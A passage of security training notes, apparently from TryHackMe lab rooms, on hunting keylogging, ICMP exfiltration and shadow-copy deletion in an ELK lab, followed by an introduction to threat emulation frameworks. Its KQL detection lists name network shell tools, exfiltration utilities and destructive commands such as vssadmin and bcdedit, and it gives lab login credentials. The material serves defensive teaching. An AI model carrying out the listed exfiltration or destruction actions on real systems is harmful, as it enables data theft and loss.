 is crucial. Therefore, it will be easy to categorise and stage the 
detected activity. Also, when hunting for this phase, remember that the 
attacker has already evaded the established security measures, has 
persistent access and is ready to accomplish their objectives. Finally, 
always remember that adversary profiles and motivations vary so that 
they may perform various or additional/unexpected activities depending 
on their motivation, purpose and goals.

# Proactive Threat Hunting Mindset/Approach

The
 proactive threat hunting mindset refers to actively hunting the process
 and seeking out potential threat/breach indicators within a scope. The 
utmost aim of the proactive approach is identifying the threats before 
they cause significant damage or go unnoticed in the system. The 
"unnoticed" part is known as "**Dwell Time**". It represents the 
average time a threat actor has access to a compromised system before 
it's detected and eradicated. The longer the dwell time, the more risk 
of impact on the compromised system as there will be more opportunity to
 accomplish the goals (actions on objectives). Many security provider 
reports and analysis outcomes indicate that the current average dwelling
 time is 20-25 days (per Q1 of 2023). Shrinking the average dwell as 
much as possible is another aim of all blue teamers. This is where the 
proactive mindset/approach increases the effectiveness of the threat 
hunting process.

Active exploration, 
hypothesis-driven approach, continuous monitoring, leverage threat 
intelligence, analytics and continuous improvement are key aspects of 
the proactive mindset. Designing and adopting a proactive threat hunting
 mindset can take time. However, working on such a track can enhance the
 security team's threat detection capabilities and maturity level, 
decreasing the average dwell time.

# Last But Not Least: Atomic Hints for Effective Threat Hunting

- It is always crucial to consider the characteristics, unique factors,
operated industry, specific threat landscape and regulatory requirements of the scope and asset owners (organisations). Observing the mentioned
key points will help you to implement a tailored and effective threat
hunting process.
- The
hunting and evaluation approaches may also vary by the implementer's
experience and implementation field. However, the foundation mindset
always stays the same: seek, detect and eradicate threats.
- Get the benefit of leveraging threat intelligence and MITRE ATT&CK mapping when it is possible/available. Also, ensure the
protection of the privacy and non-disclosure agreement points.
- Following and identifying specific framework steps might sometimes be
overwhelming (due to case complexity or the analyst's experience level). Still, it is always possible to start with a customised (slightly
simplified) approach and collaborate with team members and
responsible/authorised stakeholders.

# Toolset and Hints

You have an ELK
 instance in this room to help you hunt in multiple log files. All log 
data is pre-generated and provided in a separate index for each hunt 
scenario. Further details are shared in the below tables.

**Connection Details and Notes**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/0a085c7d0da1057045e758a95405c2c2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/0a085c7d0da1057045e758a95405c2c2.png)

- **URL**
- **Username**
- **Password**
- http://10.10.166.162/app/home#/
- elastic
- elastic

**The attached VM is only a web interface to the ELK dashboard. Use VPN or AttackBox to access the ELK dashboard over shared IP.
The instance may take up to 3-5 minutes to initialise.**[Go to dashboard](http://machine_ip/app/home#/)

| **Hunting Interface** | • ELK Dashboard. |
| --- | --- |
| **Datasets** | • Three unique datasets/indexes are provided for each task (hunt scenario). |
| **Log Details** | • 
Windows's native logging capability is supported with further audit configuration and Sysmon. |

### Case: Collection

Threat hunting exercise focused on TA0009 (also known as a collection). The case example covers hunting keylogger activity.

- Available log sources
    - Security
    - Sysmon
    - Windows PowerShell
    - PowerShell Operational

### Case: Exfiltration

Threat hunting 
exercise focused on TA0010 (also known as exfiltration). The case 
example covers hunting data exfiltration over ICMP.

- Available log sources
    - Security
    - Sysmon
    - Windows PowerShell
    - PowerShell Operational

### Case: Impact

Threat hunting 
exercise focused on TA0040 (also known as impact). The case example 
covers hunting data destruction and manipulation via native system 
resources.

- Available log sources
    - Security
    - Sysmon
    - System
    - Windows PowerShell
    - PowerShell Operational
    

# Tactic: Collection

The collection tactic (also known as **TA0009**)
 is a set of techniques used (or could be used) by adversaries to gather
 valuable data from the target system that could be useful for their 
objectives. As the target data is directly linked with the adversary's 
objectives, it is not always possible to identify which data type is 
significantly at risk. However, there are a few commonly acquired data 
sources that should be considered during threat hunting:

- Data that can be used for exploitation, pivoting, privilege escalation.
- Data can be used for intelligence gathering.
- Data can be monetised.
- Data includes confidential, financial records, intellectual property, and personally identifiable information (PII).

**Commonly used techniques are listed below:**

- Man-in-the-middle
- ARP / LLMNR Poisoning
- SMB Relay
- DHCP Spoofing
- Hijacking
- Traffic dump
- Keylogging
- Input capture
- Data collection from local/cloud/repositories

The table below summarises the collection tactic (also known as TA0009).

| **Importance** | The
 actions carried out under this tactic will help the analyst understand 
the adversary's motivation and plans for the next steps. Focusing on 
this aspect could enable early detection of full compromise or impact 
on/over valuable data/assets. |
| --- | --- |
| **Link to Other Tactics** | The collection tactic is seen to be used with the following tactics:
• Initial Access
• Lateral Movement
• Exfiltration
• Impact |
| **Suggestions and Best Practices Against TA0009** | The
 following points will help security teams enhance the overall system's 
resilience and help threat hunters conduct more efficient and proactive 
hunting.

• Develop data asset inventory of valuable/sensitive data, track access controls, and audit asset/file actions.
• Set up a continuous endpoint and network monitoring solution and configure audit logs accordingly.
• Track user and account activities to identify unusual user activities.
• Use DLP and UBA solutions. |

# Case Example: Hunting Keylogging

This
 case example demonstrates a hunting exercise for keylogger hunting. The
 mini scenario is hunting a keylogger activity triggered by an abused 
administrative account or an attacker who gains an administrative shell 
session. Note that the pre and post-activities are not within the scope 
of this hunt; the case example is directly focused on detecting 
keylogging activity.

Let's skim over the essential points with the "how things are working" mindset to start hunting keyloggers.

Keyloggers
 (also known as keystroke loggers) are tools/utilities that record all 
performed keyboard activities. Most common forms are implemented with 
direct API
 calls, registry modifiers, malicious driver files, customised scripts 
and function calls, and packed executables. Most modern security tools 
can detect keylogger patterns, but the ability to manually hunt 
malicious patterns is vital to survive on the battlefield of threat 
hunting.

Note that there are various procedures for implementing 
keylogger and detecting it. In this case, we are hunting one of the 
common forms of the keylogger activities: API Execution. The below table summarises the main characteristics of the keystroke logging approach for the given case.

| **Keystroke Log Approach** | **Procedure and Example** |
| --- | --- |
| Windows API Execution | Keylogging with API and function calls and common calls are listed below:
• GetKeyboardState
• SetWindowsHook
• GetKeyState
• GetAsynKeyState
• VirtualKey
• vKey
• filesCreated
• DrawText |
| Hooks | Keylogging with low-level hooks common hooks are listed below:
• SetWindowHookEx
• WH_KEYBOARD
• WH_KEYBOARD_LL
• WH_MOUSE_LL
• WH_GETMESSAGE |

**Base Hints**

**Case Index =** `case_collection`

**Filtering fields to investigate specific log types:**

- `winlog.channel`
- `winlog.provider_name`

Starting
 with the given scenario and information, we will use overall search 
insights on process executions and pattern matches. Our hypothesis is 
clear; we look for keylogging actions on the given pattern scope. We 
will quickly check if any of the available log files have a match with 
any of the given patterns by using the following KQL query:

- `GetKeyboardState* or *SetWindowsHook* or *GetKeyState* or *GetAsynKeyState* or
*VirtualKey* or *vKey* or *filesCreated* or *DrawText*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/a5345d7fd9e24736e520e1fd82a4d136.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/a5345d7fd9e24736e520e1fd82a4d136.png)

Based
 on the results, it can be seen that there are multiple pattern matches 
in the given index. Implementing a quick filter also shows that the main
 visibility is coming from the following log file:

- `Microsoft-Windows-PowerShell/Operational`

Adding column filters shows the file contains the suspicious patterns.

- Selected columns:
    - `winlog.channel`
    - `winlog.event_data.Path`
    - `winlog.event_data.ScriptBlockText`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/4343b64b66ab99427c8e9fe7c424a9a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/4343b64b66ab99427c8e9fe7c424a9a5.png)

Now
 we have the suspicious file name executed code block, which gives 
another suspicious file name, so let's dig deeper to understand the 
linked activities with the discovered files by using the following 
query:

- `chrome-update_api.ps1* or *chrome_local_profile.db*`

Note that we set the following columns to increase visibility:

- `winlog.channel`
- `winlog.event_data.Path`
- `winlog.event_data.ScriptBlockText`
- `winlog.event_data.CommandLine`
- `winlog.event_data.Data.#text`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fd8b5bb249f99535fbe55fbedbb29bc7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fd8b5bb249f99535fbe55fbedbb29bc7.png)

The previous results show that the suspicious PowerShell file is 
downloaded using the 'wget' command and executed by the user. The 
executed file is a script; the details are visible in the applied 
columns. Based on the visible script lines, we can see that the second 
suspicious file is the keylogger's database. Let's dig deeper to find 
out more details about the database file using the following query:

- `winlog.event_data.ScriptBlockText : "*chrome_local_profile.db*"`

Updating the column filters to increase visibility:

- `winlog.event_data.Path`
- `winlog.event_data.ScriptBlockText`
- `winlog.event_data.Payload`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/9b26259a6d30dbd89c056811d795fb62.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/9b26259a6d30dbd89c056811d795fb62.png)

This
 result gives more insight into the database file. The 'cat' command is 
used to list/view the contents of files, so it may be possible to see 
the contents of the database file and discover the logged keystrokes.

At
 this point, the findings could be used to build a search chain 
correlating the parent-child relationship of process executions to gain 
more insight into the suspicious script and database file. Similarly, 
focusing on the command execution time and digging into the following 
events using the `View surrounding documents` option will provide a similar option.

Required steps to do so:

- Click the upper left arrow to expand the details of the log/event.
- Click on the "View surrounding documents" link/button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1a2c893ce77bd6425b4f2b1c0d4622bf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1a2c893ce77bd6425b4f2b1c0d4622bf.png)

This option creates a list showing the events in chronological order. Click on the `Load 5 newer documents`
 link/button to follow the events after the cat command has been 
executed. Note that the event you clicked on will be highlighted in 
light blue as the starting point for your search.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/33fdd1ffb5e336586708baec7665a6bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/33fdd1ffb5e336586708baec7665a6bb.png)

We
 expected to have a copy of the command results on the terminal, as the 
command output is not redirected to any file or address. That's why we 
focused on the executed command, time and payload details. Now, the 
contents of the keylogger database are fully visible!

**Conclusion**

Based on the results, there are multiple activities, including Chrome, PowerShell, Notepad and other system programs. After investigating the results carefully, we notice that PowerShell
 starts a process that leads to child processes, which downloads the 
malicious script from a remote host, logs the keystrokes and creates a 
database file in the system.

This
 is the simplest way of hunting keylogger activity with a given pattern 
set. Still, you should keep track of the detected files and processes to
 identify the relations between them, create a timeline and discover the
 logged/stolen data.

**Suggestions on where to look and what to do next:**

- File creation activities to detect when and how the malicious PowerShell script is created.
- Process relations to understand the start point of the adversary activity.
- Function calls to understand if the adversary opens or transfers the dump database.

# Tactic: Exfiltration

The
 exfiltration tactic (also known as TA0010) is a set of techniques used 
(or could be used) by adversaries to steal or leak data from the target 
system/network. As the utmost aim of the tactic is to steal/leak data, 
the compression and encryption techniques also appear here. Compression 
and encryption are usually used to gather the maximum amount of data possible and avoid detection. The common forms of appearance of the tactic are listed below:

- Sending data out to command and control servers/channels.
- Sending data out to alternative channels by using size limits on transmission.

Commonly used techniques are listed below:

- Traffic Duplication
- Data transfer over alternative protocols
- Data transfer over encrypted/unencrypted C2 Channel
- Exfiltration over web service and cloud storage mediums
- Exfiltration over Bluetooth and portable devices

Note
 that the mentioned exfiltration techniques could be triggered by 
automation or scheduled jobs. The table below summarises the 
exfiltration tactic (also known as TA00010).

| **Importance** | The
 actions carried out under this tactic highlight the lost or compromised
 data (data breach). Hunting and understanding the details of this phase
 of the attack chain will help security teams detect the weaknesses and 
gaps in the implemented security measures. Also, understanding how the 
data is exfiltrated is vital to mitigate and enhance the 
detection/prevention ability of the system against similar data breach 
attempts. |
| --- | --- |
| **Link to Other Tactics** | As
 the tactic is the accomplished action on the target system and the 
consequence of the successful attack, it can be considered in the last 
part of the attack chain. Therefore, the hunter should consider the 
previous steps, which usually start with the following: 
• initial access
• persistence
• privilege escalation and other relevant tactics required to inflict the present damage. |
| **Suggestions and Best Practices Against TA0010** | The
 following points will help security teams enhance the overall system's 
resilience and help threat hunters conduct more efficient and proactive 
hunting.
• Data classification and access controls.
• Improve monitoring and use of DLP solutions.
• Implement data encryption for sensitive data. |

# Case Example: Data Exfiltration over ICMP

This
 case example demonstrates a hunting exercise for data exfiltration over
 ICMP. The mini scenario is hunting data exfiltration over the ICMP 
traffic channel by focusing on pure Windows artefacts. Note that, this 
time, we focus on system and processes instead of network traffic to get
 an insight into the event and learn the changes that occur at the 
system/process level during data exfiltration.

Note
 that there are various procedures for implementing exfiltration and 
detecting it. Typically, adversaries system native or their own command 
and control channel with controlled size limits to transmit/exfiltrate 
data. Sometimes, adversaries implement two stages of exfiltration by 
transferring the data to an alternative network location over an 
unencrypted protocol before transferring it to their dedicated and 
encrypted command and control channel. Network IDS and IPS
 solutions provide incredible details on detecting such activities. 
Again, understanding the system-level processes of the scripted action 
is a big plus. The table below summarises the main characteristics of 
the common data exfiltration approach for the given case.

| Exfiltration Approach | Procedure and Example |
| --- | --- |
| Scripting with system tools and utilities | Command execution and file access activities,  common calls are listed below:
• ping, ipconfig, arp, route, telnet
• tracert, nslookup, netstat, netsh
• localhost, host, smb, smtp,scp, ssh,
• wget, curl, certutil, net use,
• nc, ncat, netcut, socat, dnscat, ngrok
• psfile, psping
• tcpvcon, tftp, socks,
• Invoke-WebRequest, server, http, post, ssl, encod, chunk, ssl |

Base Hints

Case Index = `case_exfiltration`

Filtering fields to investigate specific log types:

- `winlog.channel`
- `winlog.provider_name`

Starting
 with the given scenario and information, we will use overall search 
insights on process executions and pattern matches. Our hypothesis is 
clear: we are looking for a system tool call that leads to data 
transfer. We will quickly check if any of the given log files have a 
match with any of the given patterns by using the following KQL query:

- `$ping* or *$ipconfig* or *$arp* or *$route* or *$telnet* or *$tracert* or
*$nslookup* or *$netstat* or *$netsh* or *$smb* or *$smtp* or *$scp* or
*$ssh* or *$wget* or *$curl* or *$certutil* or *$nc* or *$ncat* or
*$netcut* or *$socat* or *$dnscat* or *$ngrok* or *$psfile* or *$psping* or *$tcpvcon* or *$tftp* or *$socks* or *$Invoke-WebRequest* or
*$server* or *$post* or *$ssl* or *$encod* or *$chunk* or *$ssl*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8a2ce383b028ea8988a28bd31d53ad60.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8a2ce383b028ea8988a28bd31d53ad60.png)

There is one hit! Now, let's continue hunting with the detected system call by running this filter:

- `System.Net.Networkinformation.ping*`

Note that we filtered the following column to reveal if any executable file is involved in the suspicious activity:

- `winlog.event_data.Path`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/a81e3a962764c9eec88ad562ff1c1898.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/a81e3a962764c9eec88ad562ff1c1898.png)

The result shows a suspicious PowerShell
 script. Expand the log and look at the details. This script is 
transferring files using ICMP packets. In other words, it is a data 
exfiltration script!

Using the `View Surrounding Documents` option might give a good insight into the script, but let's run the following query to see all associated activity.

- `icmp4data.ps1*`

Updating the column filters to increase visibility:

- `winlog.event_data.Path`
- `winlog.event_data.ScriptBlockText`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/6ab57de915f573c2ec8195e3acda9745.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/6ab57de915f573c2ec8195e3acda9745.png)

The
 query returns precise results to end the hunt by identifying the 
exfiltrating script, the exfiltrated file and the upload server!

**Conclusion**

Based on the results, it can be seen that the discovered 
script is used for exfiltrating data over ICMP protocol. Unlike the 
previous hunt, no prior indicator of downloading the exfiltration script
 exists. It is most likely created by the adversary or planted with a 
different technique.

This is the simplest way of hunting data 
exfiltration with system native tools over unencrypted channels. Still, 
you should investigate the query results to deepen and enrich your 
findings. Identify how the script works and which data is exfiltrated.

**Suggestions on where to look and what to do next:**

- Exfiltration script analysis (how it works).
- Exfiltration destination.
- Connections made to the exfiltration destination.

# Tactic: Impact

The
 Impact tactic (also known as TA0040) is a set of techniques used (or 
could be used) by adversaries to disrupt the availability, hinder the 
expected functionality and compromise integrity by accomplishing a set 
of procedures with a manner of data destruction/disruption/manipulation.
 Since each adversary has different purposes, a hunter should always 
consider as much as possibilities over valuable data or system 
resources. Sometimes, adversaries alter the data and make all processes 
look fine during exploitation. Therefore, hunting the impact part of the
 attack chain requires excellent attention to find the needle in the 
haystack. The common forms of appearance of the tactic are listed below.

- Ransomware
- File destruction and removal
- Data manipulation

Commonly used techniques are listed below:

- Interrupting system environment by modifying primary settings
    - Account manipulation
    - Access manipulation
    - Network configuration
- Data destruction, disruption and manipulation
- Data encryption
- Defacement
- Service destruction

The table below summarises the impact tactic (also known as TA0040).

| **Importance** | The
 actions carried out under this tactic are consequences of the 
successful attack. Hunting and understanding the details of this phase 
of the attack chain will help security teams detect the weaknesses and 
gaps in the implemented security measures. Understanding this phase is 
vital to mitigate the risks and enhance the detection/prevention ability
 of the system against similar threats. |
| --- | --- |
| **Link to Other Tactics** | Like
 the exfiltration tactic, the impact tactic can be considered in the 
last part of the attack chain. So, considering the previous steps and 
creating use case examples after the hunt is essential. |
| **Suggestions and Best Practices Against TA0040** | The
 following points will help security teams enhance the overall system's 
resilience and help threat hunters conduct more efficient and proactive 
hunting.
• Conduct regular risk assessments, threat hunting and penetration testing.
• Implement in-depth hardening and zero-trust model (where possible).
• Improve the visibility and monitoring.
• Prepare and implement incident response and disaster recovery plans. |

# Case Example: Data Disruption/Manipulation

This
 example demonstrates a hunting exercise for data destruction and 
recovery manipulation over native system processes. The mini scenario is
 hunting shadow backup removal and system recovery point corruption, the
 same as the Olympic Destroyer APT group does.

Note
 that there are various procedures for implementing system 
disruption/manipulation and detecting it. Typically, adversaries use 
native system utilities to evade the security products and stay 
undetected. While ransomware is one of the first things that comes to 
mind, it is not always used for indirect long-term system disruption 
goals. Therefore, the silent evil goals could be accepted as less 
visible but have a similar impact. The table below summarises the main 
characteristics of the common data disruption approach for the given 
case.

| Exfiltration Approach | Procedure and Example |
| --- | --- |
| Scripting with system tools and utilities | Command execution and file access activities,  common calls are listed below:
• del, rm
• vssadmin, wbadmin
• bcdedit, wevutil
• shadow, recovery, bootstatuspolicy |

Base Hints

Case Index = `case_impact`

Filtering fields to investigate specific log types:

- `winlog.channel`
- `winlog.provider_name`

Starting
 with the given scenario and information, we will use overall search 
insights on process executions and pattern matches. Our hypothesis is 
clear: We are looking for a system tool call that leads to system 
disruption and data manipulation. We will quickly check if any of the 
given log files match with any of the given patterns by using the 
following KQL query:

- `del* or *rm* or *vssadmin* or *wbadmin* or *bcdedit* or *wevutil* or *shadow* *recovery* or *bootstatuspolicy*`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/3d247645e625840de49588ce8addccf2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/3d247645e625840de49588ce8addccf2.png)

Results are challenging to gain insight into. Let's visualise by log sources and decide where to focus first.

- Click on the following field and choose the visualise option:
    - `winlog.channel`
- Then, select the table format.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/4b3582d46feddb0829e14d8066a8e847.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/4b3582d46feddb0829e14d8066a8e847.png)

As
 we are looking for system native tools, the Security log could provide 
the low-hanging fruit. Let's return to our main filter and add the 
Security log as a log source filter.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1149940b7960eb3e013f3a2f7d3638b3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1149940b7960eb3e013f3a2f7d3638b3.png)

The
 time field can help us highlight the first command executed. However, 
we still need to identify the actual starting point of the action. Let's
 focus on the first suspicious event by filtering the Event ID without 
narrowing the search with log sources.

- `winlog.event_data.ProcessId : "1972"`

Updating the column filters to increase visibility:

- `winlog.event_data.CommandLine`
- `winlog.event_data.ParentProcessName`
- `winlog.event_data.ProcessId`
- `winlog.event_data.ParentProcessId`
- `winlog.event_data.ParentImage`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/6b65debd327cc755728a8a19a0d5c579.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/6b65debd327cc755728a8a19a0d5c579.png)

This
 query provides results that are clear enough to explore and correlate 
the parent-child process relationship. So, the parent process is found 
and visible with all the nested details you need!

**Conclusion**

Based on the results, it can be seen that the revealed actions
 are targeted to disrupt the system by removing shadow copies and 
destroying the system recovery point/service.

This is the simplest
 way of hunting data system data manipulation with native system 
tools/utilities. Still, you should investigate the query results to 
deepen and enrich your findings.

Suggestions on where to look and what to do next:

- Discovering the primary process that launched the subprocess to do planned adversary actions.
- Identifying the chained PowerShell and CommandShell executions.

# Conclusion

Congratulations!
 You have completed hunting three different MITRE ATT&CK tactics. To
 conclude the room, let's summarise the hunting methodologies we 
discussed thoroughly.

| **Tactic** | **Hunting Methodology** |
| --- | --- |
| Collection | • Implement baselining and monitor file changes.
• Monitor network traffic data spikes and anomalies.
• Monitor driver installations.
• Monitor process and registry activities. |
| Exfiltration | • Monitor command executions.
• Monitor file access.
• Monitor network traffic data. |
| Impact | • Monitor command executions.
• Monitor file modification and deletion.
• Monitor snapshot, volume, drive and image load, access and deletion.
• Monitor AS API execution. |

The list below will help you create a proactive hunting ability and a more resilient attack surface.

- Learn your environment scope, components and expected activity patterns.
- Implement a continuous monitoring solution to improve visibility.
- Implement behavioural analysis and threat intelligence solutions.
- Plan and practice threat hunting, purple teaming and incident response drills.

This
 room covered ways to hunt suspicious activities related to actions on 
objectives within a compromised host. Once the threat actors and 
adversaries successfully compromise a host, they accomplish their 
actions on objectives after gaining enough resources from the previous 
attack steps. This room presents an interactive environment to exercise 
some common actions on objective procedures implemented by adversaries.

# **THREAT EMULATION**

# Purpose of Threat Emulation

Threat emulation is meant to assist 
security teams and organisations, in general, in better understanding 
their security posture and their defence mechanisms and performing due 
diligence in their compliance. This ensures they are provided with an 
adversary's perspective of an attack without the hassle of dealing with 
an actual threat with malicious intent. Additionally, the organisation 
will be well prepared if a real-time and sophisticated attack is 
initiated against them. With this know-how, the following common 
assumptions about an attack would be avoided:

- *"We applied all patches."*
- *"Our applications have multi-factor authentication applied."*
- *"We have the network segmented, implemented a DMZ, and traffic flows through a proxy."*
- *"Nothing will go through our firewalls, antivirus and IDS solutions."*

# Cyber Security Assessment Issues

Network owners and IT executives often wish to understand their
cyber security effectiveness. They will usually line up the following
common questions to be answered:

- *Are our people trained and alert?*
- *Are our internal processes effective?*
- *Has the technology in use properly configured and delivered
value to the business?*

These questions are addressed through cyber security
assessments, mainly red team engagements, vulnerability
assessments and penetration tests. With that, let's understand how these
practices contribute to security assessments.

Vulnerability assessments are conducted to identify vulnerabilities
in assets under a defined scope. The focus here is comprehensive and based
on the rules of engagement defined, as assessments do not include exploitation.

Penetration testing involves exploiting vulnerabilities within an
organisation under strict control of the scope and rules of engagement.
Pentests provide organisations with information about their security
posture, patching vulnerabilities and where to invest in security
training or practices.

Red teaming provides a means of looking at cyber security issues from an adversary's perspective. This generates attacks on
the organisation as though the actual adversary is attacking. This is
done in the hope of making the defensive measures better and improving
their detections.

The challenge of these assessments is that they do not represent real-world threats. They commonly identify initial
access vectors that attackers may use and do not facilitate the
entire attack cycle.

Another challenge from these assessments is the lack of
incentivisation of Red and Blue teams during engagements. No party
wishes to share their intel and TTPs (Tactics, Techniques, and Procedures) even when the benefits overlap for
both teams.

Emulation is here to address these challenges and provide a holistic
security evaluation.

# Emulation vs Simulation

There is no standard definition of this 
discipline within the industry, as people use different terminologies to
 mean roughly the
same thing. The familiar words used are **threat
emulation**, **adversary emulation**, **attack
simulation** and **purple teaming**. However, we 
shall use threat and adversary emulation interchangeably for this room 
and differentiate them from simulation. Therefore, what
is Threat Emulation?

**Threat emulation** is an intelligence-driven
impersonation of real-world attack scenarios and TTPs in a controlled
environment to test, assess and improve an organisation's security
defences and response capabilities. This means that you seek to behave as the adversary would. Threat emulation aims to
identify and mitigate security gaps before attackers exploit
them.

Emulation can be conducted as a blind operation - mainly as a Red Team
engagement and unannounced to the rest of the defensive security team -
or as a non-blind operation involving all security teams and ensuring
knowledge sharing.

In contrast, **threat simulation** commonly represents adversary functions or behaviour through
predefined and automated attack patterns that pretend to represent an
adversary. This implies that the actions taken during the exercise will
combine TTPs from one or more groups but not an exact
imitation of a particular adversary.

# Key Concepts

Threat emulation would be seen to have several key characteristics
which line up well with the Pyramid of Pain. For more information on the
Pyramid, check out the [linked room](https://tryhackme.com/room/pyramidofpainax). The concepts include the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/57e50a5493e2e1826bc6c38bddcf205a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/57e50a5493e2e1826bc6c38bddcf205a.png)

- **Real-world threats:** The MITRE ATT&CK framework and cyber threat intelligence are common
information sources to ensure threat TTPs are based on actual breaches,
APTs and campaigns.
- **Behaviour-focused:** The execution
of TTPs during an emulation exercise aims to tune defences based on
behaviours and not signatures, thus adapting to the elements of the
Pyramid.
- **Transparency:** Disclosure of
activities between the Red and Blue teams during execution ensures that
the security posture is improved holistically.
- **Collaborative:** Due to the common goal of improving organisational security, threat emulation allows teams to collaborate in their efforts.
- **Repeatable:** Some emulation tasks
would be done multiple times in the course on an exercise or numerous
exercises. These tasks can be automated, creating a baseline of
continuous practical security assessments and deployment.

Emulation can be applied to numerous instances, each with its own
goals:

- **Assessments & Improvement:** The goal is to
test personnel, assess security processes and evaluate the technology
adopted.
- **Capability Development:** Emulation enables the creation, modification and application of tools and analytics
derived from TTPs.
- **Professional Development:** What better way to teach and promote knowledge sharing about adversary
behaviours and frameworks? This breaks down the barriers between red and blue teams and fosters collaboration missions.

Threat
 emulation exercises provide vital insights to organisations to assess, 
manage and improve their abilities to protect their systems effectively 
against adversaries. At this point, one may ask how you conduct threat 
emulation and what methodologies can be followed for a successful 
exercise. We shall dive into that in the next task.

**Emulation Methodologies**

Threat
 emulation methodologies are strategies,  plans and procedures used to 
simulate and test network defences and systems against adversaries. 
There are various methodologies, each with its unique approach and level
 of technicality, but all share the goal of discovering weaknesses in 
security. It is essential to know that no adversary is alike. However, 
they would follow a methodology and have their workflows. The 
methodologies described in this task seek to provide a knowledge base 
for organisations when dealing with threats and to plan their emulation 
exercises.

Additionally, these 
methodologies can be combined when formulating your emulation plan; as 
we shall see, some are already integrated. Let us take a look at some of
 the methodologies.

## MITRE ATT&CK

The [MITRE ATT&CK Framework](https://tryhackme.com/room/mitre) is
 an industry-known knowledge base that provides information about known 
adversarial TTPs observed in actual attacks and breaches. Threat 
emulation teams can extract many benefits from integrating ATT&CK 
with their engagements as it would make it efficient when writing 
reports and mitigations related to the behaviours experimented with.

The MITRE ATT&CK matrix visually 
represents attackers' techniques to accomplish a specific objective. It 
showcases 14 tactics, from reconnaissance to impact and within each 
tactic, several adversary techniques are listed and describe the 
activity carried out. An extension of the ATT&CK matrix is the 
Navigator, a web-based tool for exploring ATT&CK matrices by 
creating colour-coded heatmap layers of techniques and sub-techniques 
used by a particular adversary.

Click to enlarge the image.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/805cefe1d44bc2b61cfcbb625ebdeaff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/805cefe1d44bc2b61cfcbb625ebdeaff.png)

## Atomic Testing

[The Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
 is a library of emulation tests developed and curated by Red Canary 
that can be executed to test security defences within an organisation. 
The testing framework provides a mechanism for learning what malicious 
activities look like and provide telemetry from
every test to facilitate defence improvements.

The atomics (individual tests) are mapped to the MITRE ATT&CK
framework, providing a pivot between threat profiles and emulation. Atomic
 Red Team supports emulation on a wide range of platforms, not only on 
known Operating Systems but also in Cloud Environments. More
on the Atomic Red Team has been covered in these rooms: [Atomic Red Team](https://tryhackme.com/room/atomicredteam) & [Caldera](https://tryhackme.com/room/caldera).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/01bfe3c6c5ca52e93a0f1ad09411521a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/01bfe3c6c5ca52e93a0f1ad09411521a.png)

# TIBER-EU Framework

The [Threat Intelligence-based Ethical Red Teaming (TIBER-EU)](https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html) is the
European framework developed to deliver controlled, bespoke, intelligence-led emulation testing on entities and organisations'
critical live production systems. It is meant to provide a guideline for
stakeholders to test and improve cyber resilience through controlled
adversary actions.

The TIBER_EU framework follows a three-phase process for end-to-end adversary testing:

### **1. Preparation Phase**

During this phase, the security teams involved in the test are
established, and the entity's management determines and approves the 
scope. This represents the formal launch of adversarial testing
by ensuring all the planning and procurement processes are
fulfilled.

### **2. Testing Phase**

The Threat Intelligence team will prepare a detailed report to
showcase the threat areas for the organisation and set up the
necessary attack scenarios based on interested adversarial behaviour.
Meanwhile, the Red Team will use this report to craft the
emulation tests against the systems, people and processes that underpin
critical functions. The Blue Team will look for the attacks
and assess how their defence systems perform against them. This
ultimately forms the aspect of collaboration between the various
security teams.

### **3. Closure Phase**

Once tests are run and defences measured, the emulation team must 
consider reporting and remediation measures. Each group will draft
